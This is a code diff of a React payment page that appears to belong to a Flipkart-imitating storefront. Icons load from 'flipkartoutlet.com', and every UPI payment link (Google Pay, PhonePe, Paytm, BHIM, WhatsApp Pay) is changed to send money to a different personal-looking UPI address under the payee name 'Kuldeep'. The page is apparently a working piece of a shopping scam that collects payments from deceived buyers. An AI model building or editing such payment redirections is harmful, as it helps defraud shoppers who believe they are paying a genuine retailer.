@@ -56,7 +56,7 @@ const PaymentDetails = () => {
                         <div class="payment-type mt-3 card p-md-5 px-3">
                             <div class="card card-click mt-3">
                                 <div class="g-pay w-100 box">
-                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
+                                    <a href="upi://pay?pa=fullyfil9012.35658812@sbi&pn=Kuldeep&am=1&cu=INR">
                                         <label> <input type="radio" name="radioGroup" value="gpay" className='payment-input' /> <img
                                             src="https://flipkartoutlet.com/assets/front/flipkart/img/gpay_icon.svg" alt=""
                                             width="30px" /> Google Pay</label>
@@ -65,7 +65,7 @@ const PaymentDetails = () => {
                             </div>
                             <div class="card card-click mt-3">
                                 <div class="g-pay w-100 box">
-                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
+                                    <a href="upi://pay?pa=fullyfil9012.35658812@sbi&pn=Kuldeep&am=1&cu=INR">
                                         <label> <input type="radio" name="radioGroup" value="phonepe" className='payment-input' /> <img
                                             src="https://flipkartoutlet.com/assets/front/flipkart/img/phonepe.svg" alt=""
                                             width="30px" /> Phone Pay</label>
@@ -74,7 +74,7 @@ const PaymentDetails = () => {
                             </div>
                             <div class="card card-click mt-3">
                                 <div class="g-pay w-100 box">
-                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
+                                    <a href="upi://pay?pa=fullyfil9012.35658812@sbi&pn=Kuldeep&am=1&cu=INR">
                                         <label><input type="radio" name="radioGroup" value="paytm" className='payment-input' /> <img
                                             src="https://flipkartoutlet.com/assets/front/flipkart/img/paytm_icon.svg" alt=""
                                             width="30px" /> Paytm</label>
@@ -83,7 +83,7 @@ const PaymentDetails = () => {
                             </div>
                             <div class="card card-click mt-3">
                                 <div class="g-pay w-100 box">
-                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
+                                    <a href="upi://pay?pa=fullyfil9012.35658812@sbi&pn=Kuldeep&am=1&cu=INR">
                                         <label> <input type="radio" name="radioGroup" value="bhim_upi" className='payment-input' /> <img
                                             src="https://flipkartoutlet.com/assets/front/flipkart/img/bhim_upi.svg" alt=""
                                             width="30px" /> BHIM UPI</label>
@@ -92,7 +92,7 @@ const PaymentDetails = () => {
                             </div>
                             <div class="card card-click mt-3 mb-3">
                                 <div class="g-pay w-100 box">
-                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
+                                    <a href="upi://pay?pa=fullyfil9012.35658812@sbi&pn=Kuldeep&am=1&cu=INR">
                                         <label><input type="radio" name="radioGroup" value="whatspp_pay" className='payment-input' /> <img
                                             src="https://flipkartoutlet.com/assets/front/flipkart/img/whatspp_pay.svg" alt=""
                                             width="30px" /> WhatsApp Pay</label>
